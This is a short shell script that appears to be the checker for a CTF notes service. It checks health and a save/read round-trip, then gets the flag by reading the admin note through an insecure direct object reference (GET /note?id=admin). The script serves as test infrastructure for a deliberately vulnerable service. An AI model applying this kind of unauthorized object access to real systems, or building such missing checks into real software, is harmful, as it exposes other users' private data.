#!/bin/sh
#
# Checker for gzctf/notes-php:test.
#
#   SLA      : /health up, plus a store→retrieve round-trip (real functionality).
#   GET flag : read the protected admin note via the IDOR and match the round flag.
#
# Exit: 0=Ok, 1=Mumble, 2=Offline, 3=InternalError.
set -u

if [ -z "${GZCTF_TARGET_IP:-}" ] || [ -z "${GZCTF_TARGET_PORT:-}" ]; then
    echo "missing GZCTF_TARGET_IP / GZCTF_TARGET_PORT" >&2
    exit 3
fi
B="http://${GZCTF_TARGET_IP}:${GZCTF_TARGET_PORT}"

# Liveness.
if ! curl -sS --max-time 5 -o /dev/null "$B/health"; then
    echo "health unreachable" >&2
    exit 2
fi

# Functionality: save a unique note then read it back.
rid="chk$$_$(date +%s)"
val="probe-$rid"
if ! curl -sS --max-time 5 -X POST --data "$val" "$B/save?id=$rid" >/dev/null; then
    echo "save request failed" >&2
    exit 2
fi
got="$(curl -sS --max-time 5 "$B/note?id=$rid" 2>&1)"
if [ "$got" != "$val" ]; then
    echo "store/retrieve broken: got '$(printf '%s' "$got" | head -c 100)'" >&2
    exit 1
fi

# Warmup: service works but no flag planted yet → Mumble (can't verify content).
if [ -z "${GZCTF_FLAG:-}" ]; then
    echo "no GZCTF_FLAG (warmup)" >&2
    exit 1
fi

# Get flag through the IDOR on the admin note.
flag="$(curl -sS --max-time 5 "$B/note?id=admin" 2>&1)"
case "$flag" in
    *"$GZCTF_FLAG"*) exit 0 ;;
    *)
        echo "admin note missing flag: $(printf '%s' "$flag" | head -c 100)" >&2
        exit 1
        ;;
esac
